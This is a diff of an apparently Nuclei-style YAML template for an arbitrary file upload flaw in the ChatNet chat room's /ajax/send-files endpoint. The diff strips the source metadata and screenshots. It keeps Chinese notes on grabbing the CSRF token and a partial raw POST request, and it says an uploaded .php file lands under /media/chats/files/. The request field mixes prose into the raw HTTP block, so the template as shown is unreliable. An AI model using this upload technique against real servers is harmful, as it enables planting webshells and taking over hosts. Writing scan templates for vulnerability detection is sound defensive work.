@@ -3,17 +3,12 @@ info:
   name: ChatNet聊天室send-file任意⽂件上传漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sgfxsi8ge6pg1g6g'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sgfxsi8ge6pg1g6g
-    fofa: body="/static/vendor/toastr/toastr.min.css"
 http:
 - raw:
   - '的CSRF Token 在⽹站⾸⻚就能获取到，直接Ctrl+U 查看⽹站源码，然后搜索Token 即可获取到
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745575308586-bbb64068-f01d-4c20-bb03-62fb5f937b82.png)
 
     POST /ajax/send-files HTTP/1.1
 
@@ -60,7 +55,6 @@ http:
 
     ------WebKitFormBoundarywTK0blfVOgFIlHoB--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745575308811-2fc55aff-779c-44df-bcb6-a5cc9bc7751c.png)
 
     ⽂件是上传路径：http://IP/media/chats/files/xxx.php'
   redirects: false
